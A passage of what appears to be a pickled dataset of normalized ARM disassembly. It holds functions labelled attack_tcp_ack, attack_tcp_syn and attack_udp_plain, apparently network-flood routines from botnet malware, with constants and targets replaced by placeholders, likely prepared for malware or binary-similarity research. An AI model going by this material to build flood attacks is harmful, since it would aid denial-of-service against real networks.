SL0\nSTRB~R3,[R5,0]\nLDRB~R3,[R5,0]\nAND~R2,R10,0\nBIC~R3,R3,0\nORR~R3,R3,R2,LSL0\nSTRB~R3,[R5,0]\nLDRB~R3,[R5,0]\nAND~R2,R8,0\nBIC~R3,R3,0\nORR~R3,R3,R2,LSL0\nSTRB~R3,[R5,0]\nLDRB~R3,[R5,0]\nAND~R2,R7,0\nBIC~R3,R3,0\nORR~R2,R2,R3\nSTRB~R2,[R5,0]\nADD~R0,R5,0\nLDR~R1,[SP,0]\nBL~FOO\nB~FOO\nTST~R2,0\nBEQ~FOO\nMOV~R0,R6\nBL~FOO\nB~FOO\nMOV~R0,0\nBL~FOO\nRSB~R0,R4,R0\nCMP~R0,0\nBLE~FOO\nMOV~R0,R6\nBL~FOO\nB~FOO\nLDR~R3,[SP,0]\nADD~R3,R3,0\nSTR~R3,[SP,0]\nLDR~R2,[SP,0]\nCMP~R3,R2\nBLT~FOO\nMOV~R3,0\nLDR~R0,[SP,0]\nCMP~R0,R3\nBLE~FOO\nSTR~R3,[SP,0]\nMOV~R1,R3\nMOV~R7,0\nLDR~R2,[SP,0]\nADD~R10,R2,0\nMOV~R8,R10,LSL0\nMOV~R9,R8,LSR0\nLDR~R3,[SP,0]\nLDR~R6,[R3,R1,LSL0]\nMOV~R5,R6\nADD~R4,R6,0\nMOV~R3,0\nLDR~R0,[SP,0]\nCMP~R0,R3\nBNE~FOO\nBL~FOO\nSTRB~R0,[R6,0]\nMOV~R0,R0,ASR0\nSTRB~R0,[R6,0]\nLDR~R1,[SP,0]\nCMP~R1,0\nADDNE~R0,R4,0\nLDRNE~R1,[SP,0]\nBLNE~FOO\nSTRB~R7,[R5,0]\nSTRB~R7,[R5,0]\nMOV~R0,R5\nMOV~R1,0\nBL~FOO\nSTRB~R0,[R5,0]\nMOV~R0,R0,ASR0\nSTRB~R0,[R5,0]\nLDR~R2,[SP,0]\nMOV~R2,R2,LSL0\nADD~R2,R11,R2\nLDR~R3,[R2,0]\nMOV~R1,R3,LSL0\nADD~R3,R3,0\nSTR~R3,[R2,0]\nMOV~R3,R1,LSR0\nAND~R3,R3,0\nORR~R3,R3,R1,LSR0\nSTR~R3,[R4,0]\nLDR~R3,[SP,0]\nMOV~R3,R3,LSL0\nADD~R3,R3,R11\nLDR~R2,[R3,0]\nMOV~R2,R2,LSL0\nMOV~R3,R2,LSR0\nAND~R3,R3,0\nORR~R3,R3,R2,LSR0\nSTR~R3,[R4,0]\nSTRB~R7,[R4,0]\nSTRB~R7,[R4,0]\nMOV~R2,R8,LSR0\nAND~R2,R2,0\nMOV~R0,R5\nMOV~R1,R4\nORR~R2,R9,R2,LSL0\nMOV~R3,R10\nBL~FOO\nSTRB~R0,[R4,0]\nMOV~R0,R0,ASR0\nSTRB~R0,[R4,0]\nLDR~R3,[SP,0]\nMOV~R2,R3,LSL0\nSUB~R2,R2,R3,LSL0\nLDR~R3,[SP,0]\nADD~R2,R2,R3\nLDR~R3,[R4]\nMOV~R3,R3,LSR0\nSTRB~R3,[R2,0]\nMOV~R3,R3,ASR0\nSTRB~R3,[R2,0]\nSTR~R2,[SP]\nMOV~R3,0\nSTR~R3,[SP,0]\nLDR~R0,[SP,0]\nMOV~R1,R6\nLDR~R3,[SP,0]\nADD~R2,R3,0\nMOV~R3,0\nBL~FOO\nLDR~R3,[SP,0]\nADD~R1,R3,0\nSTR~R1,[SP,0]\nLDR~R0,[SP,0]\nCMP~R1,R0\nBLT~FOO\nB~FOO\nADD~SP,SP,0\nLDMFD~SP!,{R4-R11,PC}"'
p53
L2128L
tp54
a(S'attack_tcp_ack'
p55
S'"STMFD~SP!,{R4-R11,LR}\nSUB~SP,SP,0\nMOV~R11,R1\nMOV~R5,R3\nAND~R0,R0,0\nSTR~R0,[SP,0]\nAND~R4,R2,0\nMOV~R1,0\nBL~FOO\nSTR~R0,[SP,0]\nMOV~R0,R4\nMOV~R1,R5\nMOV~R2,0\nMOV~R3,0\nBL~FOO\nAND~R0,R0,0\nSTR~R0,[SP,0]\nMOV~R6,0\nMOV~R0,R4\nMOV~R1,R5\nMOV~R2,0\nMOV~R3,R6\nBL~FOO\nSTR~R0,[SP,0]\nMOV~R0,R4\nMOV~R1,R5\nMOV~R2,0\nMOV~R3,0\nBL~FOO\nAND~R0,R0,0\nSTR~R0,[SP,0]\nMOV~R0,R4\nMOV~R1,R5\nMOV~R2,0\nMOV~R3,0\nBL~FOO\nAND~R0,R0,0\nSTR~R0,[SP,0]\nMOV~R0,R4\nMOV~R1,R5\nMOV~R2,0\nMOV~R3,R6\nBL~FOO\nSTR~R0,[SP,0]\nMOV~R0,R4\nMOV~R1,R5\nMOV~R2,0\nMOV~R3,R6\nBL~FOO\nMOV~R9,R0\nMOV~R0,R4\nMOV~R1,R5\nMOV~R2,0\nMOV~R3,R6\nBL~FOO\nSTR~R0,[SP,0]\nSTR~R0,[SP,0]\nMOV~R0,R4\nMOV~R1,R5\nMOV~R2,0\nMOV~R3,R6\nBL~FOO\nSTR~R0,[SP,0]\nMOV~R0,R4\nMOV~R1,R5\nMOV~R2,0\nMOV~R3,0\nBL~FOO\nAND~R0,R0,0\nSTR~R0,[SP,0]\nMOV~R0,R4\nMOV~R1,R5\nMOV~R2,0\nMOV~R3,0\nBL~FOO\nAND~R0,R0,0\nSTR~R0,[SP,0]\nMOV~R0,R4\nMOV~R1,R5\nMOV~R2,0\nMOV~R3,0\nBL~FOO\nAND~R0,R0,0\nSTR~R0,[SP,0]\nMOV~R0,R4\nMOV~R1,R5\nMOV~R2,0\nMOV~R3,0\nBL~FOO\nAND~R8,R0,0\nMOV~R0,R4\nMOV~R1,R5\nMOV~R2,0\nMOV~R3,0\nBL~FOO\nAND~R7,R0,0\nMOV~R0,R4\nMOV~R1,R5\nMOV~R2,0\nMOV~R3,0\nBL~FOO\nAND~R6,R0,0\nMOV~R0,R4\nMOV~R1,R5\nMOV~R2,0\nMOV~R3,0\nBL~FOO\nMOV~R10,R0\nMOV~R0,R4\nMOV~R1,R5\nMOV~R2,0\nMOV~R3,R2\nBL~FOO\nAND~R0,R0,0\nSTR~R0,[SP,0]\nMOV~R0,R4\nMOV~R1,R5\nMOV~R2,0\nLDR~R3,<STR>\nLDR~R3,[R3]\nBL~FOO\nSTR~R0,[SP,0]\nMOV~R0,0\nMOV~R1,0\nMOV~R2,0\nBL~FOO\nSTR~R0,[SP,0]\nCMN~R0,0\nBEQ~FOO\nADD~R3,SP,0\nMOV~R2,0\nSTR~R2,[R3,-0]\nADD~R2,R2,0\nSTR~R2,[SP]\nMOV~R1,0\nSUB~R2,R2,0\nBL~FOO\nCMN~R0,0\nBNE~FOO\nLDR~R0,[SP,0]\nBL~FOO\nB~FOO\nLDR~R0,[SP,0]\nSTR~R0,[SP,0]\nLDR~R1,[SP,0]\nMOV~R3,R1,LSL0\nMOV~R3,R3,LSR0\nSTR~R3,[SP,0]\nLDR~R2,[SP,0]\nMOV~R3,R2,LSL0\nMOV~R3,R3,LSR0\nSTR~R3,[SP,0]\nMOV~R3,R9,LSL0\nMOV~R3,R3,LSR0\nSTR~R3,[SP,0]\nMOV~R3,0\nSTR~R3,[SP,0]\nLDR~R9,[SP,0]\nCMP~R9,0\nBLE~FOO\nMOV~R4,R3\nADD~R3,R10,0\nMOV~R5,R3,LSL0\nMOV~R3,R5,LSR0\nSTR~R3,[SP,0]\nMOV~R0,0\nMOV~R1,0\nBL~FOO\nLDR~R1,[SP,0]\nSTR~R0,[R1,R4,LSL0]\nLDR~R3,[SP,0]\nLDR~R2,[SP,0]\nLDR~R1,[R2,R3,LSL0]\nADD~R4,R1,0\nLDRB~R3,[R1]\nBIC~R3,R3,0\nORR~R3,R3,0\nSTRB~R3,[R1]\nLDRB~R3,[R1]\nBIC~R3,R3,0\nORR~R3,R3,0\nSTRB~R3,[R1]\nLDR~R3,[SP,0]\nSTRB~R3,[R1,0]\nMOV~R3,R5,LSR0\nAND~R3,R3,0\nLDR~R0,[SP,0]\nORR~R3,R0,R3,LSL0\nSTRB~R3,[R1,0]\nMOV~R3,R3,ASR0\nSTRB~R3,[R1,0]\nLDR~R2,[SP,0]\nMOV~R3,R2,LSR0\nAND~R2,R2,0\nORR~R3,R3,R2,LSL0\nSTRB~R3,[R1,0]\nMOV~R3,R3,ASR0\nSTRB~R3,[R1,0]\nLDR~R3,[SP,0]\nSTRB~R3,[R1,0]\nLDR~R0,[SP,0]\nCMP~R0,0\nMOVNE~R3,0\nSTRNEB~R3,[R1,0]\nSUBNE~R3,R3,0\nSTRNEB~R3,[R1,0]\nMOV~R3,0\nSTRB~R3,[R1,0]\nLDR~R2,[SP,0]\nSTR~R2,[R1,0]\nLDR~R2,[SP,0]\nMOV~R3,R2,LSL0\nSUB~R3,R3,R2,LSL0\nADD~R3,R3,R11\nLDR~R3,[R3,0]\nSTR~R3,[R1,0]\nLDR~R0,[SP,0]\nMOV~R3,R0,LSR0\nAND~R2,R0,0\nORR~R3,R3,R2,LSL0\nSTRB~R3,[R4]\nMOV~R3,R3,ASR0\nSTRB~R3,[R4,0]\nLDR~R1,[SP,0]\nMOV~R3,R1,LSR0\nAND~R2,R1,0\nORR~R3,R3,R2,LSL0\nSTRB~R3,[R4,0]\nMOV~R3,R3,ASR0\nSTRB~R3,[R4,0]\nLDR~R2,[SP,0]\nMOV~R3,R2,LSL0\nMOV~R2,R3,LSR0\nMOV~R3,R3,LSR0\nAND~R2,R2,0\nORR~R3,R3,R2,LSL0\nSTR~R3,[R4,0]\nLDRB~R3,[R4,0]\nBIC~R3,R3,0\nORR~R3,R3,0\nSTRB~R3,[R4,0]\nLDRB~R3,[R4,0]\nLDR~R0,[SP,0]\nAND~R2,R0,0\nBIC~R3,R3,0\nORR~R3,R3,R2,LSL0\nSTRB~R3,[R4,0]\nLDRB~R3,[R4,0]\nLDR~R1,[SP,0]\nAND~R2,R1,0\nBIC~R3,R3,0\nORR~R3,R3,R2,LSL0\nSTRB~R3,[R4,0]\nLDRB~R3,[R4,0]\nLDR~R0,[SP,0]\nAND~R2,R0,0\nBIC~R3,R3,0\nORR~R3,R3,R2,LSL0\nSTRB~R3,[R4,0]\nLDRB~R3,[R4,0]\nAND~R2,R8,0\nBIC~R3,R3,0\nORR~R3,R3,R2,LSL0\nSTRB~R3,[R4,0]\nLDRB~R3,[R4,0]\nAND~R2,R7,0\nBIC~R3,R3,0\nORR~R3,R3,R2,LSL0\nSTRB~R3,[R4,0]\nLDRB~R3,[R4,0]\nAND~R2,R6,0\nBIC~R3,R3,0\nORR~R2,R2,R3\nSTRB~R2,[R4,0]\nBL~FOO\nSTRB~R0,[R4,0]\nMOV~R0,R0,ASR0\nSTRB~R0,[R4,0]\nLDR~R1,[SP,0]\nCMP~R1,0\nLDRNEB~R3,[R4,0]\nORRNE~R3,R3,0\nSTRNEB~R3,[R4,0]\nADD~R0,R4,0\nMOV~R1,R10\nBL~FOO\nLDR~R3,[SP,0]\nADD~R4,R3,0\nSTR~R4,[SP,0]\nCMP~R9,R4\nBGT~FOO\nMOV~R3,0\nCMP~R9,R3\nMOV~R2,R3\nBLE~FOO\nSTR~R3,[SP,0]\nMOV~R3,0\nSUB~R8,R3,0\nLDR~R3,[SP,0]\nLDR~R7,[R3,R2,LSL0]\nMOV~R5,R7\nADD~R6,R7,0\nMOV~R3,R2,LSL0\nSUB~R3,R3,R2,LSL0\nADD~R2,R3,R11\nLDRB~R3,[R2,0]\nCMP~R3,0\nBHI~FOO\nLDR~R4,[R2,0]\nBL~FOO\nAND~R2,R4,0\nMOV~R2,R2,LSR0\nORR~R2,R2,R4,LSR0\nAND~R3,R4,0\nMOV~R4,R4,LSL0\nORR~R4,R4,R3,LSL0\nORR~R2,R2,R4\nLDR~R1,[SP,0]\nMOV~R3,R1,LSL0\nSUB~R3,R3,R1,LSL0\nADD~R3,R3,R11\nLDRB~R3,[R3,0]\nADD~R2,R2,R0,LSRR3\nAND~R3,R2,0\nMOV~R3,R3,LSR0\nORR~R3,R3,R2,LSR0\nAND~R1,R2,0\nMOV~R2,R2,LSL0\nORR~R2,R2,R1,LSL0\nORR~R3,R3,R2\nSTR~R3,[R7,0]\nLDR~R0,[SP,0]\nCMN~R0,0\nBNE~FOO\nBL~FOO\nSTR~R0,[R5,0]\nLDR~R1,[SP,0]\nCMP~R1,R8\nBNE~FOO\nBL~FOO\nSTRB~R0,[R5,0]\nMOV~R0,R0,ASR0\nSTRB~R0,[R5,0]\nLDR~R2,[SP,0]\nCMP~R2,R8\nBNE~FOO\nBL~FOO\nSTRB~R0,[R6]\nMOV~R0,R0,ASR0\nSTRB~R0,[R6,0]\nLDR~R3,[SP,0]\nCMP~R3,R8\nBNE~FOO\nBL~FOO\nSTRB~R0,[R6,0]\nMOV~R0,R0,ASR0\nSTRB~R0,[R6,0]\nLDR~R0,[SP,0]\nCMP~R0,R8\nBNE~FOO\nBL~FOO\nSTR~R0,[R6,0]\nLDR~R1,[SP,0]\nCMP~R1,R8\nBNE~FOO\nBL~FOO\nSTR~R0,[R6,0]\nLDR~R2,[SP,0]\nCMP~R2,0\nADDNE~R0,R6,0\nMOVNE~R1,R10\nBLNE~FOO\nMOV~R4,0\nSTRB~R4,[R5,0]\nSTRB~R4,[R5,0]\nMOV~R0,R5\nMOV~R1,0\nBL~FOO\nSTRB~R0,[R5,0]\nMOV~R0,R0,ASR0\nSTRB~R0,[R5,0]\nSTRB~R4,[R6,0]\nSTRB~R4,[R6,0]\nADD~R3,R10,0\nMOV~R2,R3,LSL0\nMOV~R12,R2,LSR0\nMOV~R2,R2,LSR0\nAND~R12,R12,0\nMOV~R0,R5\nMOV~R1,R6\nORR~R2,R2,R12,LSL0\nBL~FOO\nSTRB~R0,[R6,0]\nMOV~R0,R0,ASR0\nSTRB~R0,[R6,0]\nLDR~R3,[SP,0]\nMOV~R2,R3,LSL0\nSUB~R2,R2,R3,LSL0\nADD~R2,R2,R11\nLDR~R3,[R6]\nMOV~R3,R3,LSR0\nSTRB~R3,[R2,0]\nMOV~R3,R3,ASR0\nSTRB~R3,[R2,0]\nSTR~R2,[SP]\nMOV~R3,0\nSTR~R3,[SP,0]\nLDR~R0,[SP,0]\nMOV~R1,R7\nADD~R2,R10,0\nMOV~R3,0\nBL~FOO\nLDR~R3,[SP,0]\nADD~R2,R3,0\nSTR~R2,[SP,0]\nCMP~R9,R2\nBGT~FOO\nB~FOO\nADD~SP,SP,0\nLDMFD~SP!,{R4-R11,PC}"'
p56
L1688L
tp57
a(S'attack_tcp_syn'
p58
S'"STMFD~SP!,{R4-R11,LR}\nSUB~SP,SP,0\nMOV~R9,R1\nMOV~R5,R3\nAND~R0,R0,0\nSTR~R0,[SP,0]\nAND~R4,R2,0\nMOV~R1,0\nBL~FOO\nMOV~R11,R0\nMOV~R0,R4\nMOV~R1,R5\nMOV~R2,0\nMOV~R3,0\nBL~FOO\nAND~R0,R0,0\nSTR~R0,[SP,0]\nMOV~R6,0\nMOV~R0,R4\nMOV~R1,R5\nMOV~R2,0\nMOV~R3,R6\nBL~FOO\nMOV~R10,R0\nMOV~R0,R4\nMOV~R1,R5\nMOV~R2,0\nMOV~R3,0\nBL~FOO\nAND~R0,R0,0\nSTR~R0,[SP,0]\nMOV~R0,R4\nMOV~R1,R5\nMOV~R2,0\nMOV~R3,0\nBL~FOO\nAND~R0,R0,0\nSTR~R0,[SP,0]\nMOV~R0,R4\nMOV~R1,R5\nMOV~R2,0\nMOV~R3,R6\nBL~FOO\nMOV~R8,R0\nMOV~R0,R4\nMOV~R1,R5\nMOV~R2,0\nMOV~R3,R6\nBL~FOO\nMOV~R7,R0\nMOV~R0,R4\nMOV~R1,R5\nMOV~R2,0\nMOV~R3,R6\nBL~FOO\nSTR~R0,[SP,0]\nSTR~R0,[SP,0]\nMOV~R0,R4\nMOV~R1,R5\nMOV~R2,0\nMOV~R3,0\nBL~FOO\nSTR~R0,[SP,0]\nMOV~R0,R4\nMOV~R1,R5\nMOV~R2,0\nMOV~R3,0\nBL~FOO\nMOV~R6,R0\nMOV~R0,R4\nMOV~R1,R5\nMOV~R2,0\nMOV~R3,0\nBL~FOO\nAND~R0,R0,0\nSTR~R0,[SP,0]\nMOV~R0,R4\nMOV~R1,R5\nMOV~R2,0\nMOV~R3,0\nBL~FOO\nAND~R0,R0,0\nSTR~R0,[SP,0]\nMOV~R0,R4\nMOV~R1,R5\nMOV~R2,0\nMOV~R3,0\nBL~FOO\nAND~R0,R0,0\nSTR~R0,[SP,0]\nMOV~R0,R4\nMOV~R1,R5\nMOV~R2,0\nMOV~R3,0\nBL~FOO\nAND~R0,R0,0\nSTR~R0,[SP,0]\nMOV~R0,R4\nMOV~R1,R5\nMOV~R2,0\nMOV~R3,0\nBL~FOO\nAND~R0,R0,0\nSTR~R0,[SP,0]\nMOV~R0,R4\nMOV~R1,R5\nMOV~R2,0\nLDR~R3,<STR>\nLDR~R3,[R3]\nBL~FOO\nSTR~R0,[SP,0]\nMOV~R0,0\nMOV~R1,0\nMOV~R2,0\nBL~FOO\nSTR~R0,[SP,0]\nCMN~R0,0\nBEQ~FOO\nADD~R3,SP,0\nMOV~R2,0\nSTR~R2,[R3,-0]\nADD~R2,R2,0\nSTR~R2,[SP]\nMOV~R1,0\nSUB~R2,R2,0\nBL~FOO\nCMN~R0,0\nBNE~FOO\nLDR~R0,[SP,0]\nBL~FOO\nB~FOO\nSTR~R11,[SP,0]\nMOV~R3,R10,LSL0\nMOV~R3,R3,LSR0\nSTR~R3,[SP,0]\nMOV~R3,R8,LSL0\nMOV~R3,R3,LSR0\nSTR~R3,[SP,0]\nMOV~R3,R7,LSL0\nMOV~R11,R3,LSR0\nAND~R6,R6,0\nSTR~R6,[SP,0]\nMOV~R3,0\nSTR~R3,[SP,0]\nLDR~R10,[SP,0]\nCMP~R10,0\nBLE~FOO\nMOV~R4,R3\nLDR~R1,[SP,0]\nMOV~R1,R1,LSR0\nSTR~R1,[SP,0]\nMOV~R0,0\nMOV~R1,0\nBL~FOO\nLDR~R2,[SP,0]\nSTR~R0,[R2,R4,LSL0]\nLDR~R3,[SP,0]\nLDR~R1,[R2,R3,LSL0]\nADD~R0,R1,0\nADD~R12,R1,0\nLDRB~R3,[R1]\nBIC~R3,R3,0\nORR~R3,R3,0\nSTRB~R3,[R1]\nLDRB~R3,[R1]\nBIC~R3,R3,0\nORR~R3,R3,0\nSTRB~R3,[R1]\nLDR~R3,[SP,0]\nSTRB~R3,[R1,0]\nMOV~R2,0\nSTRB~R2,[R1,0]\nMOV~R3,0\nSTRB~R3,[R1,0]\nLDR~R2,[SP,0]\nAND~R3,R2,0\nLDR~R2,[SP,0]\nORR~R3,R2,R3,LSL0\nSTRB~R3,[R1,0]\nMOV~R3,R3,ASR0\nSTRB~R3,[R1,0]\nLDR~R3,[SP,0]\nSTRB~R3,[R1,0]\nLDR~R2,[SP,0]\nCMP~R2,0\nMOVNE~R3,0\nSTRNEB~R3,[R1,0]\nMOVNE~R3,0\nSTRNEB~R3,[R1,0]\nMOV~R6,0\nSTRB~R6,[R1,0]\nLDR~R2,[SP,0]\nSTR~R2,[R1,0]\nLDR~R2,[SP,0]\nMOV~R3,R2,LSL0\nSUB~R3,R3,R2,LSL0\nADD~R3,R3,R9\nLDR~R3,[R3,0]\nSTR~R3,[R1,0]\nLDR~R1,[SP,0]\nMOV~R3,R1,LSR0\nAND~R2,R1,0\nORR~R3,R3,R2,LSL0\nSTRB~R3,[R0]\nMOV~R3,R3,ASR0\nSTRB~R3,[R0,0]\nMOV~R3,R11,LSR0\nAND~R2,R11,0\nORR~R3,R3,R2,LSL0\nSTRB~R3,[R0,0]\nMOV~R3,R3,ASR0\nSTRB~R3,[R0,0]\nLDR~R2,[SP,0]\nMOV~R3,R2,LSL0\nMOV~R2,R3,LSR0\nMOV~R3,R3,LSR0\nAND~R2,R2,0\nORR~R3,R3,R2,LSL0\nSTR~R3,[R0,0]\nLDRB~R3,[R0,0]\nBIC~R3,R3,0\nORR~R3,R3,0\nSTRB~R3,[R0,0]\nLDRB~R3,[R0,0]\nLDR~R1,[SP,0]\nAND~R2,R1,0\nBIC~R3,R3,0\nORR~R3,R3,R2,LSL0\nSTRB~R3,[R0,0]\nLDRB~R3,[R0,0]\nLDR~R1,[SP,0]\nAND~R2,R1,0\nBIC~R3,R3,0\nORR~R3,R3,R2,LSL0\nSTRB~R3,[R0,0]\nLDRB~R3,[R0,0]\nLDR~R1,[SP,0]\nAND~R2,R1,0\nBIC~R3,R3,0\nORR~R3,R3,R2,LSL0\nSTRB~R3,[R0,0]\nLDRB~R3,[R0,0]\nLDR~R1,[SP,0]\nAND~R2,R1,0\nBIC~R3,R3,0\nORR~R3,R3,R2,LSL0\nSTRB~R3,[R0,0]\nLDRB~R3,[R0,0]\nLDR~R1,[SP,0]\nAND~R2,R1,0\nBIC~R3,R3,0\nORR~R3,R3,R2,LSL0\nSTRB~R3,[R0,0]\nLDRB~R3,[R0,0]\nLDR~R1,[SP,0]\nAND~R2,R1,0\nBIC~R3,R3,0\nORR~R2,R2,R3\nSTRB~R2,[R0,0]\nMOV~R7,0\nMOV~R4,R12\nSTRB~R7,[R4]\nMOV~R5,0\nSTRB~R5,[R12,0]\nADD~R8,R4,0\nBL~FOO\nAND~R0,R0,0\nMOV~R3,0\nADD~R0,R0,R3\nMOV~R0,R0,LSL0\nMOV~R3,R0,LSR0\nAND~R3,R3,0\nORR~R3,R3,R0,LSR0\nSTRB~R3,[R4,0]\nMOV~R3,R3,ASR0\nSTRB~R3,[R8,0]\nSTRB~R5,[R4,0]\nSTRB~R7,[R4,0]\nMOV~R3,0\nSTRB~R3,[R4,0]\nADD~R3,R3,0\nSTRB~R3,[R4,0]\nBL~FOO\nSTR~R0,[R4,0]\nMOV~R2,0\nSTR~R2,[R4,0]\nMOV~R3,0\nSTRB~R3,[R4,0]\nADD~R3,R3,0\nSTRB~R3,[R4,0]\nSTRB~R3,[R4,0]\nSTRB~R6,[R4,0]\nLDR~R3,[SP,0]\nADD~R4,R3,0\nSTR~R4,[SP,0]\nCMP~R10,R4\nBGT~FOO\nMOV~R3,0\nCMP~R10,R3\nMOV~R2,R3\nBLE~FOO\nSTR~R3,[SP,0]\nMOV~R3,0\nSUB~R8,R3,0\nLDR~R3,[SP,0]\nLDR~R7,[R3,R2,LSL0]\nMOV~R5,R7\nADD~R6,R7,0\nMOV~R3,R2,LSL0\nSUB~R3,R3,R2,LSL0\nADD~R2,R3,R9\nLDRB~R3,[R2,0]\nCMP~R3,0\nBHI~FOO\nLDR~R4,[R2,0]\nBL~FOO\nAND~R2,R4,0\nMOV~R2,R2,LSR0\nORR~R2,R2,R4,LSR0\nAND~R3,R4,0\nMOV~R4,R4,LSL0\nORR~R4,R4,R3,LSL0\nORR~R2,R2,R4\nLDR~R1,[SP,0]\nMOV~R3,R1,LSL0\nSUB~R3,R3,R1,LSL0\nADD~R3,R3,R9\nLDRB~R3,[R3,0]\nADD~R2,R2,R0,LSRR3\nAND~R3,R2,0\nMOV~R3,R3,LSR0\nORR~R3,R3,R2,LSR0\nAND~R1,R2,0\nMOV~R2,R2,LSL0\nORR~R2,R2,R1,LSL0\nORR~R3,R3,R2\nSTR~R3,[R7,0]\nLDR~R1,[SP,0]\nCMN~R1,0\nBNE~FOO\nBL~FOO\nSTR~R0,[R5,0]\nLDR~R2,[SP,0]\nCMP~R2,R8\nBNE~FOO\nBL~FOO\nSTRB~R0,[R5,0]\nMOV~R0,R0,ASR0\nSTRB~R0,[R5,0]\nLDR~R3,[SP,0]\nCMP~R3,R8\nBNE~FOO\nBL~FOO\nSTRB~R0,[R6]\nMOV~R0,R0,ASR0\nSTRB~R0,[R6,0]\nCMP~R11,R8\nBNE~FOO\nBL~FOO\nSTRB~R0,[R6,0]\nMOV~R0,R0,ASR0\nSTRB~R0,[R6,0]\nLDR~R1,[SP,0]\nCMP~R1,R8\nBNE~FOO\nBL~FOO\nSTR~R0,[R6,0]\nLDR~R2,[SP,0]\nCMP~R2,R8\nBNE~FOO\nBL~FOO\nSTR~R0,[R6,0]\nLDR~R3,[SP,0]\nCMP~R3,0\nBEQ~FOO\nBL~FOO\nSTRB~R0,[R6,0]\nMOV~R0,R0,ASR0\nSTRB~R0,[R6,0]\nMOV~R4,0\nSTRB~R4,[R5,0]\nSTRB~R4,[R5,0]\nMOV~R0,R5\nMOV~R1,0\nBL~FOO\nSTRB~R0,[R5,0]\nMOV~R0,R0,ASR0\nSTRB~R0,[R5,0]\nSTRB~R4,[R6,0]\nSTRB~R4,[R6,0]\nMOV~R0,R5\nMOV~R1,R6\nMOV~R2,0\nMOV~R3,0\nBL~FOO\nSTRB~R0,[R6,0]\nMOV~R0,R0,ASR0\nSTRB~R0,[R6,0]\nLDR~R3,[SP,0]\nMOV~R2,R3,LSL0\nSUB~R2,R2,R3,LSL0\nADD~R2,R2,R9\nLDR~R3,[R6]\nMOV~R3,R3,LSR0\nSTRB~R3,[R2,0]\nMOV~R3,R3,ASR0\nSTRB~R3,[R2,0]\nSTR~R2,[SP]\nMOV~R3,0\nSTR~R3,[SP,0]\nLDR~R0,[SP,0]\nMOV~R1,R7\nMOV~R2,0\nMOV~R3,0\nBL~FOO\nLDR~R3,[SP,0]\nADD~R2,R3,0\nSTR~R2,[SP,0]\nCMP~R10,R2\nBGT~FOO\nB~FOO\nADD~SP,SP,0\nLDMFD~SP!,{R4-R11,PC}"'
p59
L1700L
tp60
a(S'attack_udp_plain'
p61
S'"STMFD~SP!,{R4-R11,LR}\nSUB~SP,SP,0\nSTR~R1,[SP,0]\nMOV~R5,R3\nAND~R0,R0,0\nSTR~R0,[SP,0]\nAND~R4,R2,0\nMOV~R1,0\nBL~FOO\nMOV~R11,R0\nLDR~R0,[SP,0]\nMOV~R1,0\nBL~FOO\nMOV~R8,R0\nMOV~R6,0\nMOV~R0,R4\nMOV~R1,R5\nMOV~R2,0\nMOV~R3,R6\nBL~FOO\nMOV~R0,R0,LSL0\nMOV~R0,R0,LSR0\nSTR~R0,[SP,0]\nMOV~R0,R4\nMOV~R1,R5\nMOV~R2,0\nMOV~R3,R6\nBL~FOO\nMOV~R0,R0,LSL0\nMOV~R7,R0,LSR0\nMOV~R0,R4\nMOV~R1,R5\nMOV~R2,0\nMOV~R3,0\nBL~FOO\nMOV~R0,R0,LSL0\nMOV~R10,R0,LSR0\nMOV~R0,R4\nMOV~R1,R5\nMOV~R2,0\nMOV~R3,R2\nBL~FOO\nAND~R9,R0,0\nMOV~R3,0\nSTR~R3,[SP,0]\nSTR~R3,[SP,0]\nSTR~R3,[SP,0]\nSTR~R3,[SP,0]\nCMP~R7,R6\nANDNE~R3,R7,0\nMOVNE~R3,R3,LSL0\nORRNE~R6,R3,R7,LSR0\nBNE~FOO\nBL~FOO\nMOV~R0,R0,LSL0\nMOV~R6,R0,LSR0\nLDR~R7,[SP,0]\nCMP~R7,0\nBLE~FOO\nLDR~R5,[SP,0]\nMOV~R2,0\nSTR~R2,[SP,0]\nSTR~R2,[SP,0]\nLDR~R3,[SP,0]\nMOV~R3,R3,LSR0\nSTR~R3,[SP]\nMOV~R0,0\nMOV~R1,0\nBL~FOO\nLDR~R2,[SP,0]\nSTR~R0,[R2,R11]\nLDR~R3,[SP,0]\nMOV~R2,0\nCMP~R3,R2\nBNE~FOO\nBL~FOO\nSTRB~R0,[R5,0]\nMOV~R0,R0,ASR0\nSTRB~R0,[R5,0]\nB~FOO\nLDR~R2,[SP,0]\nAND~R3,R2,0\nLDR~R2,[SP]\nORR~R3,R2,R3,LSL0\nSTRB~R3,[R5,0]\nMOV~R3,R3,ASR0\nSTRB~R3,[R5,0]\nMOV~R0,0\nMOV~R1,R0\nMOV~R2,0\nBL~FOO\nLDR~R2,[SP,0]\nSTR~R2,[SP,0]\nSTR~R0,[R2,R8]\nCMN~R0,0\nBEQ~FOO\nMOV~R2,0\nMOV~R3,0\nSTRB~R3,[SP,0]\nSTRB~R2,[SP,0]\nSTRB~R6,[SP,0]\nMOV~R3,R6,ASR0\nSTRB~R3,[SP,0]\nSTR~R2,[SP,0]\nADD~R1,SP,0\nADD~R2,R2,0\nBL~FOO\nSTR~R5,[SP,0]\nLDRB~R3,[R5,0]\nCMP~R3,0\nBHI~FOO\nLDR~R4,[R5,0]\nBL~FOO\nAND~R3,R4,0\nMOV~R3,R3,LSR0\nORR~R3,R3,R4,LSR0\nAND~R2,R4,0\nMOV~R4,R4,LSL0\nORR~R4,R4,R2,LSL0\nORR~R3,R3,R4\nLDRB~R2,[R5,0]\nADD~R3,R3,R0,LSRR2\nAND~R2,R3,0\nMOV~R2,R2,LSR0\nORR~R2,R2,R3,LSR0\nAND~R1,R3,0\nMOV~R3,R3,LSL0\nORR~R3,R3,R1,LSL0\nORR~R2,R2,R3\nSTR~R2,[R5,0]\nLDR~R3,[SP,0]\nLDR~R0,[R3,R8]\nLDR~R1,[SP,0]\nMOV~R2,0\nBL~FOO\nLDR~R2,[SP,0]\nADD~R2,R2,0\nSTR~R2,[SP,0]\nLDR~R3,[SP,0]\nADD~R3,R3,0\nSTR~R3,[SP,0]\nADD~R5,R5,0\nCMP~R7,R2\nBNE~FOO\nCMP~R7,0\nBLE~FOO\nMOV~R6,0\nMOV~R4,R6\nLDR~R5,[R4,R11]\nCMP~R9,0\nMOVNE~R0,R5\nMOVNE~R1,R10\nBLNE~FOO\nLDR~R0,[R4,R8]\nMOV~R1,R5\nMOV~R2,R10\nMOV~R3,0\nBL~FOO\nADD~R6,R6,0\nADD~R4,R4,0\nCMP~R6,R7\nBNE~FOO\nB~FOO\nADD~SP,SP,0\nLDMFD~SP!,{R4-R11,PC}"'
p62
L672L
tp63
a(S'attack_udp_generic'
p64
